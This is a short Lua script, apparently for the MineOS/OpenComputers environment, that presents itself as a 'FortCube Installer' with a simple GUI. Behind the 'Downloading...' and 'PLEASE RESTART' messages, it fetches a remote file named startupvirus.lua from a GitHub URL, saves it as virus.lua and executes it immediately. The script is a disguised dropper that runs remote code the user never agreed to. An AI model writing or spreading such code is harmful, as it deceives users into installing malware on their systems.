local GUI = require("GUI")
local INTERNET = require("INTERNET")

--------------------------------------------------------------------------------

local workspace = GUI.workspace()
workspace:addChild(GUI.panel(1, 1, workspace.width, workspace.height, 0x2D2D2D))

workspace:addChild(GUI.text(3, 2, 0xFFFFFF, "FortCube Installer "))
workspace:addChild(GUI.text(3, 3, 0xFFFFFF, "Downloading..."))
workspace:addChild(GUI.text(3, 3, 0xFFFFFF, "PLEASE RESTART"))
internet.download("https://raw.githubusercontent.com/EletrixtimeYT/ELTXCRY/main/startupvirus.lua", "/eltxcry/virus.lua")

system.execute("/eltxcry/virus.lua")





--------------------------------------------------------------------------------
workspace:draw()
workspace:start()
